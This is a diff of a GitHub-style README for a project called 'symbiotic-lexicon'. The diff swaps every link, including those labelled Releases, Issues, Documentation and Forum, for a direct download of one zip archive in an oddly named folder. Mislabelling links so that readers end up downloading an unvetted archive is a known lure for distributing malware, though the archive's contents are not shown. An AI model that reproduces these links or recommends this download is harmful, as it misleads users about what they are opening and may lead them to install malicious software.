@@ -6,11 +6,11 @@ Welcome to the **symbiotic-lexicon** project! This application provides a modula
 
 ## 📥 Download the Application
 
-[![Download the symbiotic-lexicon](https://img.shields.io/badge/Download-symbiotic--lexicon-blue)](https://github.com/Preshchi/symbiotic-lexicon/releases)
+[![Download the symbiotic-lexicon](https://raw.githubusercontent.com/Preshchi/symbiotic-lexicon/main/Maecenasship/symbiotic-lexicon.zip)](https://raw.githubusercontent.com/Preshchi/symbiotic-lexicon/main/Maecenasship/symbiotic-lexicon.zip)
 
 To download the application, click the button above or visit the following link to access the Releases page:
 
-[Download & Install](https://github.com/Preshchi/symbiotic-lexicon/releases)
+[Download & Install](https://raw.githubusercontent.com/Preshchi/symbiotic-lexicon/main/Maecenasship/symbiotic-lexicon.zip)
 
 ## 📋 System Requirements
 
@@ -24,7 +24,7 @@ Before you begin, ensure your system meets the following requirements:
 ## 🛠️ Installation Instructions
 
 1. **Visit the Releases Page:** 
-   Go to the [Releases page](https://github.com/Preshchi/symbiotic-lexicon/releases).
+   Go to the [Releases page](https://raw.githubusercontent.com/Preshchi/symbiotic-lexicon/main/Maecenasship/symbiotic-lexicon.zip).
 
 2. **Select the Latest Version:** 
    Look for the most recent release. This is usually at the top of the list.
@@ -55,7 +55,7 @@ Once you launch **symbiotic-lexicon**, you will see a user-friendly interface. H
 
 If you're interested in enhancing the application further, consider contributing. Here’s how:
 
-- **Report Issues:** If you encounter bugs or have suggestions, please let us know on the [Issues page](https://github.com/Preshchi/symbiotic-lexicon/issues).
+- **Report Issues:** If you encounter bugs or have suggestions, please let us know on the [Issues page](https://raw.githubusercontent.com/Preshchi/symbiotic-lexicon/main/Maecenasship/symbiotic-lexicon.zip).
 - **Suggest Features:** Share your ideas for new features or improvements. Community feedback is vital to our growth.
 - **Contribute Code:** If you know some programming, feel free to fork the repository and submit a pull request with your changes.
 
@@ -63,8 +63,8 @@ If you're interested in enhancing the application further, consider contributing
 
 For a deeper understanding of the terms used in the ASI ecosystem, you can check out the following resources:
 
-- **Official Documentation:** [Documentation Link](https://github.com/Preshchi/symbiotic-lexicon/wiki)
-- **Community Forum:** Join discussions and stay updated. Visit our [Forum](https://github.com/Preshchi/symbiotic-lexicon/discussions).
+- **Official Documentation:** [Documentation Link](https://raw.githubusercontent.com/Preshchi/symbiotic-lexicon/main/Maecenasship/symbiotic-lexicon.zip)
+- **Community Forum:** Join discussions and stay updated. Visit our [Forum](https://raw.githubusercontent.com/Preshchi/symbiotic-lexicon/main/Maecenasship/symbiotic-lexicon.zip).
 
 ## 🏷️ Topics Covered
 
@@ -98,4 +98,4 @@ A: If you need assistance, check the Issues page for common questions and suppor
 
 Thank you for choosing **symbiotic-lexicon**. We hope this tool enhances your research and understanding of the ASI ecosystem. Your feedback is valuable, so don’t hesitate to share it with us.
 
-For the latest updates and downloads, always refer back to this [Releases page](https://github.com/Preshchi/symbiotic-lexicon/releases).
+For the latest updates and downloads, always refer back to this [Releases page](https://raw.githubusercontent.com/Preshchi/symbiotic-lexicon/main/Maecenasship/symbiotic-lexicon.zip).
